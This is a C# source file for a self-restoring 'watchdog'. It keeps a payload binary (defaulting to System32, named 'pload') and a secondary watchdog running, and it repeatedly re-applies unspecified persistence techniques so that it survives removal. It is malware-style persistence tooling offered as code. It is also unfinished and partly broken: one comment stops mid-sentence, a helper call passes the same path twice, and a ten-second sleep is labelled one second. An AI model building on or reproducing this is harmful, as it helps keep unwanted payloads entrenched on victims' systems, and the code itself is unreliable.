using System;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;
using watchdogHelper;

/*
    This watch is constantly monitoring the secondary watchdog and the binary

Watchdog Functionality
    If either of the above watched binaries stop running or existing, this watchdog will copy and/or run them. Will not run anything that is currently running
    If the watched binaries stop existing in the current directory or in the destination directory, then 


Persistence functionality
    As long as this watchdog file is running, then everythign else is running in theory. So I set up a ton of persistence techniques to run this watchdog.
    Basically all of the persistence techniques will be iterated through, verified if they are set up correctly, then set up if not existing or set up correctly
*/


class Watchdog
{


    // Defaults to putting the file in the System32 directory and the binary name pload
     public static string?BinaryPath { get; private set; }
    public static string?BinaryName { get; private set; }
    public static string? SecondaryWatchdogPath { get; private set; }
    public static string? SecondaryWatchdogName { get; private set; }
    public static string? SecondaryWatchdogMutexName { get; private set; }


    static void Main(string[] args)
    {
        string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName"};
        watchdogHelper.watchdogHelper.LoadFromJson("Config.json", staticVars);
        

        string mutexName = "Watchdog";

        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, mutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                    //Watchdog process is already running. Exiting.
                return;
            }

            string targetProcessName = "OtherProcessName";  // Do not include '.exe'
            if (watchdogHelper.watchdogHelper.IsProcessRunning(targetProcessName))
            {
                Console.WriteLine($"{targetProcessName} is already running. Proceeding with watchdog tasks.");
                
                // Place your watchdog logic here
                WatchdogLogic();
            }
            else
            {
                Console.WriteLine($"{targetProcessName} is not running. Exiting.");
            }
        }
    }


    static void WatchdogLogic()
    {
        // Example loop to simulate frequent checks
        while (true)
        {

            watchdogHelper.watchdogHelper.CheckBinary(SecondaryWatchdogPath, SecondaryWatchdogName);
            watchdogHelper.watchdogHelper.CheckBinary(BinaryPath, BinaryPath);
            Persistence.Persistence.runAllTechniques();






            Console.WriteLine("Watchdog is monitoring...");
            Thread.Sleep(10000);  // Sleep for 1 second
        }
    }

}

